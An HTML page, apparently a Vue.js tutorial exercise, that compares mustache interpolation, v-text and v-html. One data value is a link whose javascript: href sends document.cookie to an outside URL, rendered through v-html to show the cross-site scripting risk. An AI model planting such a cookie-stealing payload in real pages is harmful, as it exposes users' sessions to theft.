<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Title</title>
	<script src="../vue.js"></script>
</head>
<body>
<div id="root">
	<div>你好,{{name}}</div>
	<div v-text="name"></div>
	<div v-text="str"></div>
	<div v-html="str1"></div>
</div>
</body>
<script>
	const vm = new Vue({
		el: '#root',
		data: {
			name: 'Mirage',
			str: '<h3>Mirage</h3>',
			str1: '<a href=javascript:location.href="http://www.bing.com?"+document.cookie>123</a>'
		}
	})
</script>
</html>
